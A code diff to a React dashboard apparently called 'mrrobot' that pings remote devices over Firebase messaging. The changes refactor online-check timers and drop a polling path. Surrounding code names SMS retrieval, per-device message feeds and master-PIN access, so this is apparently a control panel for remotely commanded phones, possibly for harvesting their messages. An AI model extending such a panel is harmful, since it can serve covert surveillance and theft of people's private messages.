@@ -1127,7 +1127,10 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   const [disableState, setDisableState] = useState<FcmState>("idle");
   const [countdown, setCountdown] = useState(0);
 
-  // Live countdown for online_check: 0 → 30s (via SSE device_updated event)
+  // Sub-admin pattern: flag so only active pings trigger "ok" — not regular heartbeats
+  const pingActiveRef = useRef(false);
+
+  // Live countdown via useEffect (clean — no side-effects in state updater)
   useEffect(() => {
     if (state !== "sending" || action !== "online_check") return;
     setCountdown(0);
@@ -1138,18 +1141,22 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   // Auto-timeout online_check after 30s
   useEffect(() => {
     if (state !== "sending" || action !== "online_check") return;
-    const t = setTimeout(() => { setState("idle"); setLog(""); }, 30000);
+    const t = setTimeout(() => {
+      pingActiveRef.current = false;
+      setState("idle"); setLog(""); setCountdown(0);
+    }, 30000);
     return () => clearTimeout(t);
   }, [state, action]);
 
-  // SSE: device responded → stop countdown & show ✓ Online
+  // WS: device_updated → success ONLY if we are actively waiting (sub-admin pattern)
   useEffect(() => {
     if (action !== "online_check") return;
     function onUpdated(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
-      if (deviceId !== device.deviceId) return;
-      setState("ok");
-      setTimeout(() => { setState("idle"); setLog(""); }, 3000);
+      if (deviceId !== device.deviceId || !pingActiveRef.current) return;
+      pingActiveRef.current = false;
+      setState("ok"); setCountdown(0);
+      setTimeout(() => { setState("idle"); setLog(""); }, 2000);
     }
     window.addEventListener("mrrobot:device_updated", onUpdated);
     return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
@@ -1158,12 +1165,13 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   async function fcm(data: Record<string, string>) {
     if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
     if (action === "online_check") {
+      pingActiveRef.current = true; // arm BEFORE sending — sub-admin exact pattern
       setState("sending"); setLog("");
       try {
         const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
-        if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); }
-        // stays "sending" until SSE fires device_updated or 30s timeout
-      } catch { setLog("Network error"); setState("err"); }
+        if (!r.ok) { const j = await r.json() as { error?: string }; pingActiveRef.current = false; setLog(j.error ?? "Failed"); setState("err"); }
+        // stays "sending" until WS fires device_updated (pingActiveRef check) or 30s timeout
+      } catch { pingActiveRef.current = false; setLog("Network error"); setState("err"); }
       return;
     }
     setState("sending"); setLog("Sending…");
@@ -1339,26 +1347,36 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
 
   // Sub-admin pattern: flag so only active pings trigger "ok" — not regular heartbeats
   const pingActiveRef = useRef(false);
-  const pingTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  function stopPingTimer() {
-    if (pingTimerRef.current) { clearInterval(pingTimerRef.current); pingTimerRef.current = null; }
-  }
+  // Live countdown via useEffect (clean — no side-effects inside state updater)
+  useEffect(() => {
+    if (pingState !== "sending") return;
+    setPingCountdown(0);
+    const iv = setInterval(() => setPingCountdown(c => c + 1), 1000);
+    return () => clearInterval(iv);
+  }, [pingState]);
+
+  // Auto-timeout at 30s
+  useEffect(() => {
+    if (pingState !== "sending") return;
+    const t = setTimeout(() => {
+      pingActiveRef.current = false;
+      setPingState("idle"); setPingCountdown(0);
+    }, 30000);
+    return () => clearTimeout(t);
+  }, [pingState]);
 
   // Live: mrrobot:device_updated → ONLY fire success if ping was actively waiting
   useEffect(() => {
     function onUpdated(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
-      if (deviceId !== device.deviceId) return;
-      if (!pingActiveRef.current) return; // ignore regular heartbeats — sub-admin pattern
+      if (deviceId !== device.deviceId || !pingActiveRef.current) return;
       pingActiveRef.current = false;
-      stopPingTimer();
-      setPingCountdown(0);
-      setPingState("ok");
+      setPingCountdown(0); setPingState("ok");
       setTimeout(() => setPingState("idle"), 2000);
     }
     window.addEventListener("mrrobot:device_updated", onUpdated);
-    return () => { window.removeEventListener("mrrobot:device_updated", onUpdated); stopPingTimer(); };
+    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
   }, [device.deviceId]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Live: mrrobot:message_added → prepend new messages for this device automatically
@@ -1377,27 +1395,12 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
 
   async function firePing() {
     if (!device.hasFcm) return;
-    // Arm the flag BEFORE sending — sub-admin exact pattern
-    pingActiveRef.current = true;
-    stopPingTimer();
-    setPingCountdown(0);
+    pingActiveRef.current = true; // arm BEFORE sending — sub-admin exact pattern
     setPingState("sending");
-    // Live countdown 0 → 30s
-    pingTimerRef.current = setInterval(() => {
-      setPingCountdown(c => {
-        if (c >= 30) {
-          pingActiveRef.current = false;
-          stopPingTimer();
-          setPingState("idle");
-          return 0;
-        }
-        return c + 1;
-      });
-    }, 1000);
     try {
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
-      if (!r.ok) { pingActiveRef.current = false; stopPingTimer(); setPingCountdown(0); setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
-    } catch { pingActiveRef.current = false; stopPingTimer(); setPingCountdown(0); setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+      if (!r.ok) { pingActiveRef.current = false; setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+    } catch { pingActiveRef.current = false; setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
   }
 
   async function fireGetSms() {
@@ -1634,28 +1637,46 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
 /* ══════════════════════════════════════════
    CARD CHECK ONLINE BUTTON (device list card)
 ══════════════════════════════════════════ */
-function CardCheckBtn({ device, masterPin }: { device: FullDevice; masterPin: string }) {
+function CardCheckBtn({ device }: { device: FullDevice }) {
   const [checking, setChecking] = useState(false);
-  const [done, setDone] = useState(false);
+  const [done, setDone]       = useState(false);
   const [seconds, setSeconds] = useState(0);
-  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
-  const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
-  const doneRef  = useRef(false);
+  const timerRef    = useRef<ReturnType<typeof setInterval> | null>(null);
+  const activeRef   = useRef(false); // true ONLY while we are waiting for ping response
 
-  function stopAll() {
+  function stopTimer() {
     if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
-    if (pollRef.current)  { clearInterval(pollRef.current);  pollRef.current  = null; }
   }
-  useEffect(() => () => stopAll(), []);
+  useEffect(() => () => stopTimer(), []);
 
-  // WS fires mrrobot:device_updated → instant success (bonus path)
+  // Live countdown via useEffect — clean, no side-effects inside state updater
+  useEffect(() => {
+    if (!checking) return;
+    setSeconds(0);
+    timerRef.current = setInterval(() => setSeconds(s => s + 1), 1000);
+    return () => stopTimer();
+  }, [checking]);
+
+  // Auto-timeout at 30s
+  useEffect(() => {
+    if (!checking) return;
+    const t = setTimeout(() => {
+      activeRef.current = false;
+      stopTimer();
+      setChecking(false); setSeconds(0);
+    }, 30000);
+    return () => clearTimeout(t);
+  }, [checking]);
+
+  // WS: device_updated → success ONLY if we are actively waiting (sub-admin pattern)
   useEffect(() => {
     function onUpdated(e: Event) {
       const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
-      if (deviceId !== device.deviceId || doneRef.current) return;
-      doneRef.current = true;
-      stopAll(); setChecking(false); setSeconds(0); setDone(true);
-      setTimeout(() => { setDone(false); doneRef.current = false; }, 3000);
+      if (deviceId !== device.deviceId || !activeRef.current) return;
+      activeRef.current = false;
+      stopTimer();
+      setChecking(false); setSeconds(0); setDone(true);
+      setTimeout(() => setDone(false), 2000);
     }
     window.addEventListener("mrrobot:device_updated", onUpdated);
     return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
@@ -1663,39 +1684,13 @@ function CardCheckBtn({ device, masterPin }: { device: FullDevice; masterPin: st
 
   async function handleClick() {
     if (checking) return;
-    stopAll(); doneRef.current = false;
-    setDone(false); setChecking(true); setSeconds(0);
-
-    // Countdown 0→30s
-    timerRef.current = setInterval(() => {
-      setSeconds(s => {
-        const next = s + 1;
-        if (next >= 30) { stopAll(); setChecking(false); setSeconds(0); return 0; }
-        return next;
-      });
-    }, 1000);
-
+    activeRef.current = true;
+    setDone(false); setChecking(true);
     try {
-      await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
-
-      // Primary: poll every 3s — compare lastOnline to detect device response
-      const prevOnline = device.lastOnline;
-      pollRef.current = setInterval(async () => {
-        if (doneRef.current) { stopAll(); return; }
-        try {
-          const r = await apiFetch(`/api/master/all-devices?search=${encodeURIComponent(device.deviceId)}&limit=5`, { headers: { "x-master-pin": masterPin } });
-          if (!r.ok) return;
-          const json = await r.json() as { data?: FullDevice[] };
-          const updated = (json.data ?? []).find(d => d.deviceId === device.deviceId);
-          if (updated && updated.lastOnline !== prevOnline) {
-            doneRef.current = true;
-            stopAll(); setChecking(false); setSeconds(0); setDone(true);
-            setTimeout(() => { setDone(false); doneRef.current = false; }, 3000);
-          }
-        } catch { /* ignore poll errors */ }
-      }, 3000);
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
+      if (!r.ok) { activeRef.current = false; stopTimer(); setChecking(false); setSeconds(0); }
     } catch {
-      stopAll(); setChecking(false); setSeconds(0);
+      activeRef.current = false; stopTimer(); setChecking(false); setSeconds(0);
     }
   }
 
@@ -1703,7 +1698,7 @@ function CardCheckBtn({ device, masterPin }: { device: FullDevice; masterPin: st
     <button onClick={() => void handleClick()} style={{
       width: "100%", borderRadius: 8, padding: "10px 4px",
       fontSize: 13, fontWeight: 700, textAlign: "center",
-      border: done ? `1px solid ${T.green}` : checking ? "1px solid #bfdbfe" : "1px solid #e2e8f0",
+      border: done ? `1px solid ${T.green}` : checking ? `1px solid ${T.accent}` : "1px solid #e2e8f0",
       background: done ? T.green : checking ? T.accent : "#f8fafc",
       color: done ? "#fff" : checking ? "#fff" : "#475569",
       cursor: checking ? "default" : "pointer",
@@ -1752,7 +1747,7 @@ const DeviceCard = memo(function DeviceCard({
         ))}
       </div>
       <div onClick={e => e.stopPropagation()}>
-        <CardCheckBtn device={device} masterPin={masterPin} />
+        <CardCheckBtn device={device} />
       </div>
     </div>
   );
